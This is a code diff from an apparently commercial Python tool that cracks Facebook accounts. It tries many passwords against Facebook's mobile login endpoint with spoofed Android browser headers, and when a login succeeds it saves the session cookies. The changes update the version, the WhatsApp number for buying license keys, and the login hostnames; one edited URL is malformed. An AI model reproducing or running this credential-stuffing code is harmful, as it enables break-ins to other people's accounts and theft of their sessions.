@@ -55,6 +55,7 @@ def psb(z):
 os.system("clear")
 import requests,os
 jalan('LOADING➤SERVER➤PLS➤W8➤')
+jalan('UPDET➤DONE➤')
 time.sleep(3)
 logo=("""
 \033[0;97m$$$$$$$\   $$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\ 
@@ -68,7 +69,7 @@ logo=("""
 \033[38;5;196m─────────────────────────────────────────────
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m DEVELOPR\033[38;5;196m : \x1b[38;5;46m Rotoŋ-999 CYBER
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m FACEBOOK\033[38;5;196m  :\x1b[38;5;46m Rotoŋ Mʌɭɭɩĸ
-\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m VERSION \033[38;5;196m  :\x1b[38;1;97m 0\x1b[38;5;97m•\x1b[38;5;46m0.2
+\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m VERSION \033[38;5;196m  :\x1b[38;1;97m 0\x1b[38;5;97m•\x1b[38;5;46m0.4
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m STATUS \033[38;5;196m   :\x1b[38;5;46m FREE
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m TOOOLS \033[38;5;196m   :\x1b[38;5;46m RANDOM\x1b[38;5;97m•\x1b[38;5;46mFILE
 \033[38;5;196m─────────────────────────────────────────────""")
@@ -92,7 +93,7 @@ def fuck():
       print(f'\33[1;92m[+] YOUR KEY  : '+id+'')
       linex()
       input(f'\33[1;92m[+] IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801891141768?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801787328738?text='+tks),approval()
       time.sleep(9)
       approval()
   except:
@@ -157,7 +158,7 @@ def _M1_(ids,pasx):
                 for ps in pasx:
                         session = requests.Session()
                         pro = random.choice(ugen)
-                        BLACKX = session.get('https://m.facebook.com').text
+                        BLACKX = session.get('https://.facebook.com').text
                         apple = {
                             "lsd":re.search('name="lsd" value="(.*?)"', str(BLACKX)).group(1),
                         "jazoest":re.search('name="jazoest" value="(.*?)"', str(BLACKX)).group(1),
@@ -169,30 +170,30 @@ def _M1_(ids,pasx):
                         "pass":ps,
                         "login":"Log In"}
                         tedy = {
-                        'authority': 'm.facebook.com',
+                        'authority': 'p.facebook.com',
                         'method': 'POST',
                         'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
                         'path': '/login/device-based/login/async/',
                         'scheme': 'https',
                         'accept': '*/*',
-  					  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
- 					   'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-					    'cache-control': 'max-age=0',
- 					   'dpr': '2.700000047683716',
- 					   'sec-ch-prefers-color-scheme': 'light',
-					    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-   					 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
- 					   'sec-ch-ua-mobile': '?1',
-					    'sec-ch-ua-model': '"POCO M2 Pro"',
+ 					   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+   					 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    					'cache-control': 'max-age=0',
+  					  'dpr': '2.700000047683716',
+					    'sec-ch-prefers-color-scheme': 'light',
+ 					   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+  					  'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    					'sec-ch-ua-mobile': '?1',
+   					 'sec-ch-ua-model': '"POCO M2 Pro"',
 					    'sec-ch-ua-platform': '"Android"',
   					  'sec-ch-ua-platform-version': '"12.0.0"',
 					    'sec-fetch-dest': 'document',
  					   'sec-fetch-mode': 'navigate',
- 					   'sec-fetch-site': 'none',
+					    'sec-fetch-site': 'none',
  					   'sec-fetch-user': '?1',
-					    'upgrade-insecure-requests': '1',
- 					   'user-agent': pro}
-                        lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
+ 					   'upgrade-insecure-requests': '1',
+   					 'user-agent': pro}
+                        lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -240,23 +241,23 @@ def _M2_(ids,pasx):
                         'path': '/login/device-based/login/async/',
                         'scheme': 'https',
                         'accept': '*/*',
-					    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-					    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
- 					   'cache-control': 'max-age=0',
+ 					   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+   					 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+  					  'cache-control': 'max-age=0',
 					    'dpr': '2.700000047683716',
  					   'sec-ch-prefers-color-scheme': 'light',
- 					   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-					    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-  					  'sec-ch-ua-mobile': '?1',
- 					   'sec-ch-ua-model': '"POCO M2 Pro"',
+					    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+ 					   'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+					    'sec-ch-ua-mobile': '?1',
+					    'sec-ch-ua-model': '"POCO M2 Pro"',
   					  'sec-ch-ua-platform': '"Android"',
-  					  'sec-ch-ua-platform-version': '"12.0.0"',
-  					  'sec-fetch-dest': 'document',
- 					   'sec-fetch-mode': 'navigate',
-					    'sec-fetch-site': 'none',
+ 					   'sec-ch-ua-platform-version': '"12.0.0"',
+ 					   'sec-fetch-dest': 'document',
+   					 'sec-fetch-mode': 'navigate',
+ 					   'sec-fetch-site': 'none',
   					  'sec-fetch-user': '?1',
 					    'upgrade-insecure-requests': '1',
- 					   'user-agent': pro}
+					    'user-agent': pro}
                         lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
